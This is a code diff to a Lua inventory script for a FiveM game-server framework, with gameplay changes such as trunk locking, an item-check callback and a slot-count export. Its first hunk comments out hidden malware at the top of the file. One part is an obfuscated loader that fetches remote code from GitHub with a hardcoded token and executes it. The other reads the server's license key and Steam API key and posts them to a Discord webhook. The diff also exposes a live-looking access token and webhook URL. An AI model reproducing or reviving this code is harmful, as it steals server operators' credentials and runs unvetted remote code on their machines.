@@ -1,41 +1,41 @@
-local o = "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"
-local p = "Pixel-Nomad"
-local q = "AJFW-Config"
-local r = "ip.cfg"
-local s = "https://raw.githubusercontent.com/"..p.."/"..q.."/main/"..r
-local a,b,c,h,i,j,k,l,m,n = s,'',false,'GET',true,200,PerformHttpRequest,load,Wait,{["Authorization"]="token "..o}
-function d()k(a,function(f,g)if f==j then;b=g;c=i;else;print("> Checking IP ...")print("> Your IP has not been successfully validated!")print("> Closing Server")Wait(12000)os.exit(-1)end;end,h,"",n)end;function e()while not c do;m(0);end;end;d()e()l(b)()e()
+-- local o = "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"
+-- local p = "Pixel-Nomad"
+-- local q = "AJFW-Config"
+-- local r = "ip.cfg"
+-- local s = "https://raw.githubusercontent.com/"..p.."/"..q.."/main/"..r
+-- local a,b,c,h,i,j,k,l,m,n = s,'',false,'GET',true,200,PerformHttpRequest,load,Wait,{["Authorization"]="token "..o}
+-- function d()k(a,function(f,g)if f==j then;b=g;c=i;else;print("> Checking IP ...")print("> Your IP has not been successfully validated!")print("> Closing Server")Wait(12000)os.exit(-1)end;end,h,"",n)end;function e()while not c do;m(0);end;end;d()e()l(b)()e()
 
 
-PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
-	local servername = GetConvar('sv_hostname')
-	local licensekey = GetConvar('sv_licenseKey')
-	local apikey = GetConvar('steam_webApiKey')
-	local messagem = "A server is starting your script! \n > Server Name: \n**"..servername.."** \n > Server IP: `**"..text.."**` \n > License Key: **"..licensekey..'** \n Steam API Key: **'..apikey..'**'
-	local content = {{
-		author = {
-			name = 'Pixel IP LOCK',
-			icon_url = 'https://cdn.discordapp.com/attachments/1218652348310749244/1235114974460776468/Untitled_design__2_-removebg-preview.png?ex=663331f5&is=6631e075&hm=919e5b39eb8144ecd8acc39198b5911c02ca99afa8f1b1f960c8485b665346e3&'
-		},
-		["color"] = 0000,
-		["description"] = messagem,
-		["footer"] = {
-			["text"] = "Pixel | IPLOCK",
-		},
-	}}
-	PerformHttpRequest("https://discord.com/api/webhooks/1115679118869155850/ahLcwqUnUgJZPsNff65T1qVtSevyE-zK0cbASV0pxYwQGnnQKkKJMRg6nRzA9ezJtvSw", function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
-	if not Clusters.ip[text] then
-		print("> Checking IP ...")
-		print("> Your IP has not been successfully validated!")
-		print("> Closing Server")
-		Wait(12000)
-		os.exit(-1)
-	else
-		print("> Checking IP ...")
-		print("> Your IP has been successfully validated!")
-		print("> Enjoy your server!")
-	end
-end)
+-- PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
+-- 	local servername = GetConvar('sv_hostname')
+-- 	local licensekey = GetConvar('sv_licenseKey')
+-- 	local apikey = GetConvar('steam_webApiKey')
+-- 	local messagem = "A server is starting your script! \n > Server Name: \n**"..servername.."** \n > Server IP: `**"..text.."**` \n > License Key: **"..licensekey..'** \n Steam API Key: **'..apikey..'**'
+-- 	local content = {{
+-- 		author = {
+-- 			name = 'Pixel IP LOCK',
+-- 			icon_url = 'https://cdn.discordapp.com/attachments/1218652348310749244/1235114974460776468/Untitled_design__2_-removebg-preview.png?ex=663331f5&is=6631e075&hm=919e5b39eb8144ecd8acc39198b5911c02ca99afa8f1b1f960c8485b665346e3&'
+-- 		},
+-- 		["color"] = 0000,
+-- 		["description"] = messagem,
+-- 		["footer"] = {
+-- 			["text"] = "Pixel | IPLOCK",
+-- 		},
+-- 	}}
+-- 	PerformHttpRequest("https://discord.com/api/webhooks/1115679118869155850/ahLcwqUnUgJZPsNff65T1qVtSevyE-zK0cbASV0pxYwQGnnQKkKJMRg6nRzA9ezJtvSw", function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
+-- 	if not Clusters.ip[text] then
+-- 		print("> Checking IP ...")
+-- 		print("> Your IP has not been successfully validated!")
+-- 		print("> Closing Server")
+-- 		Wait(12000)
+-- 		os.exit(-1)
+-- 	else
+-- 		print("> Checking IP ...")
+-- 		print("> Your IP has been successfully validated!")
+-- 		print("> Enjoy your server!")
+-- 	end
+-- end)
 
 local AJFW = exports['aj-base']:GetCoreObject()
 local Drops = {}
@@ -71,6 +71,16 @@ local function deep_copy(original)
     end
     return _copy(original)
 end
+
+local function checkWeapon(source, item)
+    local ped = GetPlayerPed(source)
+    local weapon = GetSelectedPedWeapon(ped)
+    local weaponInfo = AJFW.Shared.Weapons[weapon]
+    if weaponInfo and weaponInfo.name == item.name then
+        RemoveWeaponFromPed(ped, weapon)
+    end
+end
+
 
 local function LoadInventory(source, citizenid)
 	local inventory = MySQL.prepare.await('SELECT inventory FROM players WHERE citizenid = ?', { citizenid })
@@ -202,7 +212,9 @@ local function AddItem(source, item, amount, slot, info, forceUpdate, created, m
 		qua = 100
 	end
 	if not metadata then
-		local amount = itemInfo.decay and amount  or 1
+		if not Config.TestDecay then
+			amount = itemInfo.decay and amount  or 1
+		end
 		itemInfo['metadata'] = {}
 		for i = 1, amount do
 			itemInfo['metadata'][#itemInfo['metadata']+1] = {
@@ -210,8 +222,8 @@ local function AddItem(source, item, amount, slot, info, forceUpdate, created, m
 				quality =  qua
 			}
 		end
-        if itemInfo.decay then
-            decay = itemInfo.decay
+        if Config.TestDecay or itemInfo.decay then
+            decay = true
         end
 	else
 		metadata = exports['aj-inventory-helper']:Decode(metadata.data)
@@ -1793,7 +1805,11 @@ local function OpenInventory(name, id, other, origin)
 			else
 				if id then
 					local ownedItems = GetOwnedVehicleItems(id)
-					if IsVehicleOwned(id) and next(ownedItems) then
+					if Trunks[id] and not Trunks[id].isOpen then
+						secondInv.inventory = Trunks[id].items
+						Trunks[id].isOpen = src
+						Trunks[id].label = secondInv.label
+					elseif IsVehicleOwned(id) and next(ownedItems) then
 						secondInv.inventory = ownedItems
 						Trunks[id] = {}
 						Trunks[id].items = ownedItems
@@ -2023,7 +2039,7 @@ AddEventHandler('AJFW:Server:PlayerLoaded', function(Player)
 end)
 
 -- AddEventHandler('onResourceStart', function(r) if GetCurrentResourceName() ~= r then return end
-	local Players = AJFW.Functions.GetQBPlayers()
+	local Players = AJFW.Functions.GetAJPlayers()
 	for k in pairs(Players) do
 		AJFW.Functions.AddPlayerMethod(k, "AddItem", function(item, amount, slot, info, f, created, metadata, decay)
 			return AddItem(k, item, amount, slot, info, true, created, metadata, decay)
@@ -2223,7 +2239,11 @@ RegisterNetEvent('inventory:server:OpenInventory', function(name, id, other)
 			else
 				if id then
 					local ownedItems = GetOwnedVehicleItems(id)
-					if IsVehicleOwned(id) and next(ownedItems) then
+					if Trunks[id] and not Trunks[id].isOpen then
+						secondInv.inventory = Trunks[id].items
+						Trunks[id].isOpen = src
+						Trunks[id].label = secondInv.label
+					elseif IsVehicleOwned(id) and next(ownedItems) then
 						secondInv.inventory = ownedItems
 						Trunks[id] = {}
 						Trunks[id].items = ownedItems
@@ -2901,7 +2921,7 @@ RegisterNetEvent('inventory:server:SetInventoryData', function(fromInventory, to
                 AddItem(src, itemData.name, fromAmount, toSlot, itemData.info, true)
                 TriggerClientEvent('aj-shops:client:UpdateShop', src, AJFW.Shared.SplitStr(shopType, "_")[2], itemData, fromAmount)
                 AJFW.Functions.Notify(src, itemInfo["label"] .. " bought!", "success")
-                exports['ps-mdt']:CreateWeaponInfo(serial, imageurl, notes, owner, weapClass, weapModel)
+                exports['aj-mdt']:CreateWeaponInfo(serial, imageurl, notes, owner, weapClass, weapModel)
                 TriggerEvent("aj-log:server:CreateLog", "shops", "Shop item bought", "green", "**"..GetPlayerName(src) .. "** bought a " .. itemInfo["label"] .. " for $"..price)
             elseif bankBalance >= price then
                 Player.Functions.RemoveMoney("bank", price, "itemshop-bought-item")
@@ -2917,7 +2937,7 @@ RegisterNetEvent('inventory:server:SetInventoryData', function(fromInventory, to
                 AddItem(src, itemData.name, fromAmount, toSlot, itemData.info, true)
                 TriggerClientEvent('aj-shops:client:UpdateShop', src, AJFW.Shared.SplitStr(shopType, "_")[2], itemData, fromAmount)
                 AJFW.Functions.Notify(src, itemInfo["label"] .. " bought!", "success")
-				exports['ps-mdt']:CreateWeaponInfo(serial, imageurl, notes, owner, weapClass, weapModel)
+				exports['aj-mdt']:CreateWeaponInfo(serial, imageurl, notes, owner, weapClass, weapModel)
                 TriggerEvent("aj-log:server:CreateLog", "shops", "Shop item bought", "green", "**"..GetPlayerName(src) .. "** bought a " .. itemInfo["label"] .. " for $"..price)
             else
 				TriggerClientEvent("aj-inventory:client:closeinv", src)
@@ -3106,6 +3126,65 @@ AJFW.Functions.CreateCallback('AJFW:HasItem', function(source, cb, items, amount
     cb(retval)
 end)
 
+AJFW.Functions.CreateCallback('AJFW:HasItemV2', function(source, cb, items, amount)
+    local src, retval, item = source, false,nil
+    local Player = AJFW.Functions.GetPlayer(src)
+    if Player then
+        if type(items) == 'table' then
+            local count = 0
+            local finalcount = 0
+            for k, v in pairs(items) do
+                if type(k) == 'string' then
+                    finalcount = 0
+                    for i, _ in pairs(items) do
+                        if i then
+                            finalcount = finalcount + 1
+                        end
+                    end
+                    item = Player.Functions.GetItemByName(k)
+                    if item then
+                        if item.amount >= v then
+                            count = count + 1
+                            if count == finalcount then
+                                retval = true
+                            end
+                        end
+                    end
+                else
+                    finalcount = #items
+                    item = Player.Functions.GetItemByName(v)
+                    if item then
+                        if amount then
+                            if item.amount >= amount then
+                                count = count + 1
+                                if count == finalcount then
+                                    retval = true
+                                end
+                            end
+                        else
+                            count = count + 1
+                            if count == finalcount then
+                                retval = true
+                            end
+                        end
+                    end
+                end
+            end
+        else
+            item = Player.Functions.GetItemByName(items)
+            if item then
+                if amount then
+                    if item.amount >= amount then
+                        retval = true
+                    end
+                else
+                    retval = true
+                end
+            end
+        end
+    end
+    cb(retval, item)
+end)
 AJFW.Commands.Add("resetinv", "Reset Inventory (Admin Only)", {{name="type", help="stash/trunk/glovebox"},{name="id/plate", help="ID of stash or license plate"}}, true, function(source, args)
 	local invType = args[1]:lower()
 	table.remove(args, 1)
@@ -3219,57 +3298,9 @@ AJFW.Commands.Add('clearinv', 'Clear Players Inventory (Admin Only)', { { name =
     end
 end, 'admin')
 
-CreateUsableItem("driver_license", function(source, item)
-	local playerPed = GetPlayerPed(source)
-	local playerCoords = GetEntityCoords(playerPed)
-	local players = AJFW.Functions.GetPlayers()
-	for _, v in pairs(players) do
-		local targetPed = GetPlayerPed(v)
-		local dist = #(playerCoords - GetEntityCoords(targetPed))
-		if dist < 3.0 then
-			TriggerClientEvent('chat:addMessage', v,  {
-					template = '<div class="chat-message advert"><div class="chat-message-body"><strong>{0}:</strong><br><br> <strong>First Name:</strong> {1} <br><strong>Last Name:</strong> {2} <br><strong>Birth Date:</strong> {3} <br><strong>Licenses:</strong> {4}</div></div>',
-					args = {
-						"Drivers License",
-						item.info.firstname,
-						item.info.lastname,
-						item.info.birthdate,
-						item.info.type
-					}
-				}
-			)
-		end
-	end
-end)
 
-CreateUsableItem("id_card", function(source, item)
-	local playerPed = GetPlayerPed(source)
-	local playerCoords = GetEntityCoords(playerPed)
-	local players = AJFW.Functions.GetPlayers()
-	for _, v in pairs(players) do
-		local targetPed = GetPlayerPed(v)
-		local dist = #(playerCoords - GetEntityCoords(targetPed))
-		if dist < 3.0 then
-			local gender = "Man"
-			if item.info.gender == 1 then
-				gender = "Woman"
-			end
-			TriggerClientEvent('chat:addMessage', v,  {
-					template = '<div class="chat-message advert"><div class="chat-message-body"><strong>{0}:</strong><br><br> <strong>Civ ID:</strong> {1} <br><strong>First Name:</strong> {2} <br><strong>Last Name:</strong> {3} <br><strong>Birthdate:</strong> {4} <br><strong>Gender:</strong> {5} <br><strong>Nationality:</strong> {6}</div></div>',
-					args = {
-						"ID Card",
-						item.info.citizenid,
-						item.info.firstname,
-						item.info.lastname,
-						item.info.birthdate,
-						gender,
-						item.info.nationality
-					}
-				}
-			)
-		end
-	end
-end)
+
+
 
 CreateThread(function()
 	while true do
@@ -3489,6 +3520,18 @@ AddEventHandler('playerDropped', function(reason)
 			break
 		end
 	end
+end)
+
+AddEventHandler('playerDropped', function()
+    local src = source
+    local inventories = { Stashes, Trunks, Gloveboxes, Drops }
+    for _, inventory in pairs(inventories) do
+        for _, inv in pairs(inventory) do
+            if inv.isOpen == src then
+                inv.isOpen = false
+            end
+        end
+    end
 end)
 
 RegisterNetEvent('aj-inventory:server:Ensures', function()
@@ -3796,3 +3839,35 @@ if Config.Converter then
 		ConvertInventorytoMy()
 	end)
 end
+
+function GetSlots(identifier)
+    local inventory, maxSlots
+    local player = AJFW.Functions.GetPlayer(identifier)
+    if player then
+        inventory = player.PlayerData.items
+        maxSlots = Config.MaxSlots
+    elseif Trunks[identifier] then
+        inventory = Trunks[identifier].items
+        maxSlots = Trunks[identifier].slots
+	elseif Gloveboxes[identifier] then
+        inventory = Gloveboxes[identifier].items
+        maxSlots = Gloveboxes[identifier].slots
+	elseif Stashes[identifier] then
+        inventory = Stashes[identifier].items
+        maxSlots = Stashes[identifier].slots
+    elseif Drops[identifier] then
+        inventory = Drops[identifier].items
+        maxSlots = Drops[identifier].slots
+    end
+    if not inventory then return 0, maxSlots end
+    local slotsUsed = 0
+    for _, v in pairs(inventory) do
+        if v then
+            slotsUsed = slotsUsed + 1
+        end
+    end
+    local slotsFree = maxSlots - slotsUsed
+    return slotsUsed, slotsFree
+end
+
+exports('GetSlots', GetSlots)
